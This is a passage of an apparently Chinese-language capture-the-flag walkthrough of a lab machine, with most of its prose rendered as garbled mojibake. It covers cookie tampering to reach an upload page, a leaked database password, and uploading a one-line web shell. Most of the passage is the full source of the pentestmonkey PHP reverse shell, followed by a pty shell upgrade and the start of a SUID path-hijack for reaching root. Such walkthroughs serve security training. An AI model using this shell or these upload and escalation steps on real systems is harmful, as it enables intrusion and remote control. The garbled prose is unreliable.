class="hljs-number">256 78:03</span>:<span class="hljs-number">0e:b4:a1:af:e5:c2:f9:8d</span>:<span class="hljs-number">29</span>:<span class="hljs-number">05</span>:<span class="hljs-number">3</span>e:<span class="hljs-number">29</span>:c9:f2 (ED25519)<br><span class="hljs-number">80</span>/tcp open  http<br></code></pre></td></tr></table></figure><p>å¼€äº† 22 å’Œ 80ï¼Œè®¿é—® 80</p><p><img src="https://img.dkdun.cn/v1/2025/12/bc6c06a64e4fb429.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">What <span class="hljs-keyword">is</span> the <span class="hljs-type">path</span> <span class="hljs-keyword">to</span> the directory <span class="hljs-keyword">on</span> the webserver that <span class="hljs-keyword">returns</span> a <span class="hljs-keyword">login</span> page?<br>:/cdn-cgi/<span class="hljs-keyword">login</span><br></code></pre></td></tr></table></figure><h3 id="Task-3-6"><a href="#Task-3-6" class="headerlink" title="Task 3"></a>Task 3</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What can be modified <span class="hljs-keyword">in</span> Firefox <span class="hljs-built_in">to</span> <span class="hljs-built_in">get</span> access <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> upload page?<br>:cookie<br></code></pre></td></tr></table></figure><h3 id="Task-4-6"><a href="#Task-4-6" class="headerlink" title="Task 4"></a>Task 4</h3><p>id&#x3D;1 æ—¶ä¸º admin</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">10.129.191.100</span>/cdn-cgi/login/admin.php?content=accounts&amp;id=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/c877c650ccae7bc1.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">What <span class="hljs-keyword">is</span> the <span class="hljs-keyword">access</span> ID <span class="hljs-keyword">of</span> the <span class="hljs-keyword">admin</span> <span class="hljs-keyword">user</span>?<br>:<span class="hljs-number">34322</span><br></code></pre></td></tr></table></figure><h3 id="Task-5-6"><a href="#Task-5-6" class="headerlink" title="Task 5"></a>Task 5</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">On uploading a <span class="hljs-built_in">file</span>, what directory <span class="hljs-keyword">does</span> <span class="hljs-keyword">that</span> <span class="hljs-built_in">file</span> appear <span class="hljs-keyword">in</span> <span class="hljs-keyword">on</span> <span class="hljs-keyword">the</span> server?<br>:/uploads<br></code></pre></td></tr></table></figure><h3 id="Task-6-6"><a href="#Task-6-6" class="headerlink" title="Task 6"></a>Task 6</h3><p><img src="https://img.dkdun.cn/v1/2025/12/bb602b9c50217e2d.png"></p><p>åœ¨ uploads ä¸Šä¼ ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬ï¼Œèšå‰‘è¿æ¥ï¼Œ<code>/var/www/html/cdn-cgi/login/</code> è·¯å¾„ä¸‹æ‰¾åˆ°</p><p>db.php æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-string">&#x27;robert&#x27;</span>,<span class="hljs-string">&#x27;M3g4C0rpUs3r!&#x27;</span>,<span class="hljs-string">&#x27;garage&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">file</span> <span class="hljs-keyword">that</span> <span class="hljs-keyword">contains</span> <span class="hljs-keyword">the</span> password <span class="hljs-keyword">that</span> <span class="hljs-keyword">is</span> shared <span class="hljs-keyword">with</span> <span class="hljs-keyword">the</span> robert user?<br>:db.php<br></code></pre></td></tr></table></figure><h3 id="Task-7-6"><a href="#Task-7-6" class="headerlink" title="Task 7"></a>Task 7</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">What executible <span class="hljs-keyword">is</span> run <span class="hljs-keyword">with</span> the <span class="hljs-keyword">option</span> &quot;-group bugtracker&quot; <span class="hljs-keyword">to</span> identify <span class="hljs-keyword">all</span> files <span class="hljs-keyword">owned</span> <span class="hljs-keyword">by</span> the bugtracker <span class="hljs-keyword">group</span>?<br>:find<br></code></pre></td></tr></table></figure><h3 id="Task-8-4"><a href="#Task-8-4" class="headerlink" title="Task 8"></a>Task 8</h3><p>ä¼ ä¸Šå»çš„æ–‡ä»¶å‡ åˆ†é’Ÿå°±è¢«åˆ äº†ï¼Œæœ‰å®šæ—¶ä»»åŠ¡ï¼Œå¼¹ä¸ª shellï¼Œç”¨ kali è‡ªå¸¦çš„ webshellï¼Œ<code>/usr/share/webshells/php</code> ä¸‹çš„ <code>php-reverse-shell.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// php-reverse-shell - A Reverse Shell implementation in PHP</span><br><span class="hljs-comment">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// This tool may be used for legal purposes only.  Users take full responsibility</span><br><span class="hljs-comment">// for any actions performed using this tool.  The author accepts no liability</span><br><span class="hljs-comment">// for damage caused by this tool.  If these terms are not acceptable to you, then</span><br><span class="hljs-comment">// do not use this tool.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// In all other respects the GPL version 2 applies:</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// This program is free software; you can redistribute it and/or modify</span><br><span class="hljs-comment">// it under the terms of the GNU General Public License version 2 as</span><br><span class="hljs-comment">// published by the Free Software Foundation.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// This program is distributed in the hope that it will be useful,</span><br><span class="hljs-comment">// but WITHOUT ANY WARRANTY; without even the implied warranty of</span><br><span class="hljs-comment">// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span><br><span class="hljs-comment">// GNU General Public License for more details.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// You should have received a copy of the GNU General Public License along</span><br><span class="hljs-comment">// with this program; if not, write to the Free Software Foundation, Inc.,</span><br><span class="hljs-comment">// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// This tool may be used for legal purposes only.  Users take full responsibility</span><br><span class="hljs-comment">// for any actions performed using this tool.  If these terms are not acceptable to</span><br><span class="hljs-comment">// you, then do not use this tool.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// You are encouraged to send comments, improvements or suggestions to</span><br><span class="hljs-comment">// me at pentestmonkey@pentestmonkey.net</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Description</span><br><span class="hljs-comment">// -----------</span><br><span class="hljs-comment">// This script will make an outbound TCP connection to a hardcoded IP and port.</span><br><span class="hljs-comment">// The recipient will be given a shell running as the current user (apache normally).</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Limitations</span><br><span class="hljs-comment">// -----------</span><br><span class="hljs-comment">// proc_open and stream_set_blocking require PHP version 4.3+, or 5+</span><br><span class="hljs-comment">// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.</span><br><span class="hljs-comment">// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Usage</span><br><span class="hljs-comment">// -----</span><br><span class="hljs-comment">// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.</span><br><br><span class="hljs-title function_ invoke__">set_time_limit</span> (<span class="hljs-number">0</span>);<br><span class="hljs-variable">$VERSION</span> = <span class="hljs-string">&quot;1.0&quot;</span>;<br><span class="hljs-variable">$ip</span> = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;  <span class="hljs-comment">// CHANGE THIS</span><br><span class="hljs-variable">$port</span> = <span class="hljs-number">1234</span>;       <span class="hljs-comment">// CHANGE THIS</span><br><span class="hljs-variable">$chunk_size</span> = <span class="hljs-number">1400</span>;<br><span class="hljs-variable">$write_a</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-variable">$error_a</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-variable">$shell</span> = <span class="hljs-string">&#x27;uname -a; w; id; /bin/sh -i&#x27;</span>;<br><span class="hljs-variable">$daemon</span> = <span class="hljs-number">0</span>;<br><span class="hljs-variable">$debug</span> = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Daemonise ourself if possible to avoid zombies later</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-comment">// pcntl_fork is hardly ever available, but will allow us to daemonise</span><br><span class="hljs-comment">// our php process and avoid zombies.  Worth a try...</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;pcntl_fork&#x27;</span>)) &#123;<br>        <span class="hljs-comment">// Fork and have the parent process exit</span><br>        <span class="hljs-variable">$pid</span> = <span class="hljs-title function_ invoke__">pcntl_fork</span>();<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pid</span> == -<span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;ERROR: Can&#x27;t fork&quot;</span>);<br>                <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pid</span>) &#123;<br>                <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);  <span class="hljs-comment">// Parent exits</span><br>        &#125;<br><br>        <span class="hljs-comment">// Make the current process a session leader</span><br>        <span class="hljs-comment">// Will only succeed if we forked</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">posix_setsid</span>() == -<span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;Error: Can&#x27;t setsid()&quot;</span>);<br>                <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br><br>        <span class="hljs-variable">$daemon</span> = <span class="hljs-number">1</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// Change to a safe directory</span><br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;/&quot;</span>);<br><br><span class="hljs-comment">// Remove any umask we inherited</span><br><span class="hljs-title function_ invoke__">umask</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Do the reverse shell...</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-comment">// Open reverse connection</span><br><span class="hljs-variable">$sock</span> = <span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-variable">$ip</span>, <span class="hljs-variable">$port</span>, <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-number">30</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$sock</span>) &#123;<br>        <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$errstr</span> (<span class="hljs-subst">$errno</span>)&quot;</span>);<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-comment">// Spawn shell process</span><br><span class="hljs-variable">$descriptorspec</span> = <span class="hljs-keyword">array</span>(<br>   <span class="hljs-number">0</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>),  <span class="hljs-comment">// stdin is a pipe that the child will read from</span><br>   <span class="hljs-number">1</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>),  <span class="hljs-comment">// stdout is a pipe that the child will write to</span><br>   <span class="hljs-number">2</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)   <span class="hljs-comment">// stderr is a pipe that the child will write to</span><br>);<br><br><span class="hljs-variable">$process</span> = <span class="hljs-title function_ invoke__">proc_open</span>(<span class="hljs-variable">$shell</span>, <span class="hljs-variable">$descriptorspec</span>, <span class="hljs-variable">$pipes</span>);<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_resource</span>(<span class="hljs-variable">$process</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;ERROR: Can&#x27;t spawn shell&quot;</span>);<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-comment">// Set everything to non-blocking</span><br><span class="hljs-comment">// Reason: Occsionally reads will block, even though stream_select tells us they won&#x27;t</span><br><span class="hljs-title function_ invoke__">stream_set_blocking</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">0</span>], <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">stream_set_blocking</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">stream_set_blocking</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>], <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">stream_set_blocking</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-number">0</span>);<br><br><span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;Successfully opened reverse shell to <span class="hljs-subst">$ip</span>:<span class="hljs-subst">$port</span>&quot;</span>);<br><br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-comment">// Check for end of TCP connection</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$sock</span>)) &#123;<br>                <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;ERROR: Shell connection terminated&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// Check for end of STDOUT</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>])) &#123;<br>                <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;ERROR: Shell process terminated&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// Wait until a command is end down $sock, or some</span><br>        <span class="hljs-comment">// command output is available on STDOUT or STDERR</span><br>        <span class="hljs-variable">$read_a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>]);<br>        <span class="hljs-variable">$num_changed_sockets</span> = <span class="hljs-title function_ invoke__">stream_select</span>(<span class="hljs-variable">$read_a</span>, <span class="hljs-variable">$write_a</span>, <span class="hljs-variable">$error_a</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-comment">// If we can read from the TCP socket, send</span><br>        <span class="hljs-comment">// data to process&#x27;s STDIN</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$read_a</span>)) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;SOCK READ&quot;</span>);<br>                <span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$chunk_size</span>);<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;SOCK: <span class="hljs-subst">$input</span>&quot;</span>);<br>                <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">0</span>], <span class="hljs-variable">$input</span>);<br>        &#125;<br><br>        <span class="hljs-comment">// If we can read from the process&#x27;s STDOUT</span><br>        <span class="hljs-comment">// send data down tcp connection</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$read_a</span>)) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;STDOUT READ&quot;</span>);<br>                <span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$chunk_size</span>);<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;STDOUT: <span class="hljs-subst">$input</span>&quot;</span>);<br>                <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$input</span>);<br>        &#125;<br><br>        <span class="hljs-comment">// If we can read from the process&#x27;s STDERR</span><br>        <span class="hljs-comment">// send data down tcp connection</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>], <span class="hljs-variable">$read_a</span>)) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;STDERR READ&quot;</span>);<br>                <span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>], <span class="hljs-variable">$chunk_size</span>);<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;STDERR: <span class="hljs-subst">$input</span>&quot;</span>);<br>                <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$input</span>);<br>        &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$sock</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">0</span>]);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>]);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>]);<br><span class="hljs-title function_ invoke__">proc_close</span>(<span class="hljs-variable">$process</span>);<br><br><span class="hljs-comment">// Like print, but does nothing if we&#x27;ve daemonised ourself</span><br><span class="hljs-comment">// (I can&#x27;t figure out how to redirect STDOUT like a proper daemon)</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">printit</span> (<span class="hljs-params"><span class="hljs-variable">$string</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$daemon</span>) &#123;<br>                <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;<span class="hljs-subst">$string</span>\n&quot;</span>;<br>        &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æŠŠ IP å’Œ Port æ”¹ä¸€ä¸‹ç„¶åä¼ ä¸Šå»ï¼Œç›‘å¬</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ su<br>su: must be <span class="hljs-built_in">run</span> <span class="hljs-keyword">from</span> a terminal<br></code></pre></td></tr></table></figure><p>å¿…é¡»è¦äº¤äº’ shell</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">python3 -c <span class="hljs-symbol">&#x27;import</span> pty;pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#x27;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -<span class="hljs-built_in">type</span> f -group bugtracker 2&gt;/dev/null<br><span class="hljs-built_in">ls</span> -al /usr/bin/bugtracker<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/86e6e3cfb4b1f066.png"></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">Regardless of which <span class="hljs-keyword">user</span> <span class="hljs-title">starts</span> running the bugtracker executable, what&#x27;s <span class="hljs-keyword">user</span> <span class="hljs-title">privileges</span> will use to run?<br>:root<br></code></pre></td></tr></table></figure><h3 id="Task-9-4"><a href="#Task-9-4" class="headerlink" title="Task 9"></a>Task 9</h3><p><strong>SUID</strong> (Set owner User ID up on execution) æ˜¯ç»™äºˆæ–‡ä»¶çš„ä¸€ä¸ªç‰¹æ®Šç±»å‹çš„æ–‡ä»¶æƒé™ã€‚åœ¨ Linux&#x2F;Unix ä¸­ï¼Œå½“ä¸€ä¸ªç¨‹åºè¿è¡Œçš„æ—¶å€™ï¼Œ ç¨‹åºå°†ä»ç™»å½•ç”¨æˆ·å¤„ç»§æ‰¿æƒé™ã€‚SUID è¢«å®šä¹‰ä¸ºç»™äºˆä¸€ä¸ªç”¨æˆ·ä¸´æ—¶çš„ï¼ˆç¨‹åº&#x2F;æ–‡ä»¶ï¼‰æ‰€æœ‰è€…çš„æƒé™æ¥è¿è¡Œä¸€ä¸ªç¨‹åº&#x2F;æ–‡ä»¶<strong>ã€‚ç®€è€Œè¨€ä¹‹ç”¨æˆ·åœ¨æ‰§è¡Œç¨‹åº&#x2F;æ–‡ä»¶&#x2F;å‘½ä»¤çš„æ—¶å€™ï¼Œå°†è·å–æ–‡ä»¶æ‰€æœ‰è€…çš„æƒé™ä»¥åŠæ‰€æœ‰è€…çš„ UID å’Œ GID</strong>ã€‚</p><p>ç®€è€Œè¨€ä¹‹å°±æ˜¯ï¼Œåœ¨ä½¿ç”¨å‘½ä»¤æ—¶ç»™æ™®é€šç”¨æˆ·èµ‹äºˆæ‰€æœ‰è€…çš„æƒé™ï¼Œæ¯”å¦‚ root æƒé™</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">What SUID stands for?<br>:Set owner <span class="hljs-keyword">User</span> <span class="hljs-title">ID</span><br></code></pre></td></tr></table></figure><h3 id="Task-10-2"><a href="#Task-10-2" class="headerlink" title="Task 10"></a>Task 10</h3><p><img src="https://img.dkdun.cn/v1/2025/12/07eaaaf18ba81810.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What is <span class="hljs-keyword">the</span> name <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> executable being called <span class="hljs-keyword">in</span> <span class="hljs-keyword">an</span> insecure manner?<br>:cat<br></code></pre></td></tr></table></figure><h3 id="Submit-Flag-7"><a href="#Submit-Flag-7" class="headerlink" title="Submit Flag"></a>Submit Flag</h3><p>èšå‰‘è¿æ¥æ—¶æŸ¥çœ‹ userflag</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">Submit <span class="hljs-keyword">user</span> <span class="hljs-title">flag</span><br>:f2c74ee8db7983851ab2a96a44eb7981<br></code></pre></td></tr></table></figure><h3 id="Submit-Flag-8"><a href="#Submit-Flag-8" class="headerlink" title="Submit Flag"></a>Submit Flag</h3><p>ä»å‰é¢å·²ç»å‘ç° <code>bugtracker</code> æœ‰ root æƒé™ï¼Œå¹¶ä¸”æˆ‘ä»¬èƒ½å¤Ÿè°ƒç”¨ cat å‘½ä»¤ï¼Œcat å‘½ä»¤æ˜¯ä½¿ç”¨<strong>ç»å¯¹è·¯å¾„</strong>æ¥è°ƒç”¨çš„ï¼Œå³åœ¨å½“å‰ç”¨æˆ·çš„ç¯å¢ƒå˜é‡æŒ‡å®šçš„è·¯å¾„ä¸­æŸ¥æ‰¾ cat 